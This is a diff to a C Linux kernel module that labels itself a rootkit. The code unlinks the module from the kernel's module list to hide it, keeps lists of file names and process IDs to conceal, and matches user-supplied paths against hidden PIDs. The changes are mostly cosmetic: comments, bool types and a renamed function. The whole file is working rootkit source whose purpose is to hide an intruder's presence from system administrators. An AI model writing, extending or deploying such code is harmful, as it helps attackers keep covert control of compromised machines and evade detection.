@@ -1,10 +1,11 @@
-#include <linux/module.h> //THIS_MODULE, also includes list.h
+#include <linux/module.h>   // THIS_MODULE, also includes list.h
 #include <linux/slab.h>		// kmalloc()
-#include <linux/uaccess.h> // copy from user
-#include <linux/limits.h> // PATH_MAX
+#include <linux/uaccess.h>  // copy from user
+#include <linux/limits.h>   // PATH_MAX
 
 #include "hiding.h"
 
+// Lists
 struct list_files_node{
 	struct list_head list; // prev and next
 	char* name;
@@ -19,11 +20,11 @@ static struct list_head list_files = LIST_HEAD_INIT(list_files);
 static struct list_head list_pids = LIST_HEAD_INIT(list_pids);
 
 
-static int module_hidden = 0;
+static bool module_hidden = false;
 static struct list_head* prev_module;
 static unsigned int num_symtab_old;
 
-int is_module_hidden(void){
+bool is_module_hidden(void){
     return module_hidden;
 }
 
@@ -42,23 +43,25 @@ int hide_module(void){
 	//THIS_MODULE->kallsyms->num_symtab = 0; // TESTING
 
 	//kobject_del(&THIS_MODULE->mkobj.kobj); //TESTING
-	module_hidden = 1;
+	module_hidden = true;
 	return 0;
 }
 
 int unhide_module(void){
 	if (!module_hidden)
 		return -1;
-	list_add(&THIS_MODULE->list, prev_module); //adds the module after the module which was prev to it
-	//maybe we all die if this prev is not in the list anymore
+
+	// Adds the module after the module which was prev to it
+	// maybe we all die if this prev is not in the list anymore
+	list_add(&THIS_MODULE->list, prev_module); 
 
 	//THIS_MODULE->kallsyms->num_symtab = num_symtab_old; // TESTING
 
-	module_hidden = 0;
+	module_hidden = false;
 	return 0;
 }
 
-// DELETE LISTS
+// Delete lists
 static void delete_pids_node(struct list_pids_node* node){
     list_del(&node->list);
     kfree(node);
@@ -79,14 +82,14 @@ void delete_lists(void){
         delete_files_node(node_file);
 }
 
-// HIDE THOSE FILES
-int is_file_hidden(const char* name){
+// Hide those files
+bool is_file_hidden(const char* name){
 	struct list_files_node* node;
 	list_for_each_entry(node, &list_files, list){
 		if (strcmp(node->name, name) == 0)
-			return 1;
+			return true;
 	}
-	return 0;
+	return false;
 }
 
 int hide_file(const char* name){
@@ -95,26 +98,30 @@ int hide_file(const char* name){
 		return -1;
 	}
 
+	// Allocate a node
 	struct list_files_node* node = kmalloc(sizeof(struct list_files_node), GFP_KERNEL);
 	if (node == NULL){
 		log(KERN_INFO "ROOTKIT: ERROR allocating node for hiding file %s\n", name);
 		return -1;
 	}
 
+	// Allocate and fill the name of the node
 	node->name = kmalloc(strlen(name)+1, GFP_KERNEL);
 	if (node->name == NULL){
 		log(KERN_INFO "ROOTKIT: ERROR allocating node name for hiding file %s\n", name);
 		kfree(node);
 		return -1;
 	}
-
 	strcpy(node->name, name);
+
+	// Add the node to the list
 	list_add(&node->list, &list_files);
 	log(KERN_INFO "ROOTKIT: Hidden file %s\n", name);
 	return 0;
 }
 
 int unhide_file(const char* name){
+	// Look for the node that contains the name and delete it
 	struct list_files_node *node, *tmp;
 	list_for_each_entry_safe(node, tmp, &list_files, list){
 		if (strcmp(node->name, name) == 0){
@@ -123,28 +130,31 @@ int unhide_file(const char* name){
 			return 0;
 		}
 	}
+	// Name not found in list
 	log(KERN_INFO "ROOTKIT: ERROR trying to unhide not found file %s\n", name);
 	return -1;
 }
 
-// HIDE THOSE PIDS
-int is_pid_hidden(int pid){
+// Hide those PIDs
+bool is_pid_hidden(int pid){
 	struct list_pids_node* node;
 	list_for_each_entry(node, &list_pids, list){
 		if (node->pid == pid)
-			return 1;
+			return true;
 	}
-	return 0;
+	return false;
 }
 
 static char* my_basename(const char* pathname){
-	// Examples: proc/ /proc proc proc/pepe /proc/
+	// Examples: 1234/ /1234 1234 proc/1234 /1234/
+	// Get the basename
 	int len = strlen(pathname);
 	const char* basename = pathname;
 	for (int i = 0; i < len-1; i++)
 		if (pathname[i] == '/')
 			basename = pathname+i+1;
 
+	// Allocate memory and copy it
 	len = strlen(basename);
 	char* result = kmalloc(len+1, GFP_KERNEL);
 	if (result == NULL){
@@ -152,18 +162,21 @@ static char* my_basename(const char* pathname){
 		return result;
 	}
 	strncpy(result, basename, len);
-	if (result[len-1] == '/') //delete / on last character
+
+	// Delete / on last character
+	if (result[len-1] == '/') 
 		result[len-1] = '\x00';
 
 	return result;
 }
 
-int pathname_includes_pid(const char __user* pathname){
+int pid_in_pathname(const char __user* pathname){
     struct list_pids_node* node;
 	char pid_str[8], pid_str2[9];
 	char* filename;
 	int ret = -1;
-		
+	
+	// Copy the pathname to kernel memory.
 	// Note strnlen_user returns the size of the string including the terminating NUL
 	// and the length of strncpy_from_user also includes the terminating NUL
 	int len = strnlen_user(pathname, PATH_MAX);
@@ -171,14 +184,15 @@ int pathname_includes_pid(const char __user* pathname){
 		log("ROOTKIT: ERROR pathname larger than PATH_MAX\n");
 		return -1;
 	}
-
 	char* my_pathname = kmalloc(len, GFP_KERNEL);
 	if (my_pathname == NULL){
-		log("ROOTKIT: ERROR kmalloc(%d) in pathname_includes_pid", len);
+		log("ROOTKIT: ERROR kmalloc(%d) in pid_in_pathname", len);
 		return -1;
 	}
 	strncpy_from_user(my_pathname, pathname, len);
 
+	// Check if the basename of the pathname matches a hidden PID
+	// or if the pathname includes a folder called PID
 	list_for_each_entry(node, &list_pids, list){
 		snprintf(pid_str, sizeof(pid_str), "%d", node->pid);
 		snprintf(pid_str2, sizeof(pid_str2), "%d/", node->pid);
@@ -201,6 +215,7 @@ int hide_pid(int pid){
 		return -1;
 	}
 
+	// Allocate a node and add it to the list
 	struct list_pids_node* node = kmalloc(sizeof(struct list_pids_node), GFP_KERNEL);
 	if (node == NULL){
 		log(KERN_INFO "ROOTKIT: ERROR allocating node for hiding pid %d\n", pid);
@@ -226,7 +241,6 @@ int unhide_pid(int pid){
 	return -1;
 }
 
-// PRINT HIDDEN
 void print_hidden(void){
     log(KERN_INFO "ROOTKIT: Hidden files: ");
     struct list_files_node* node_file;
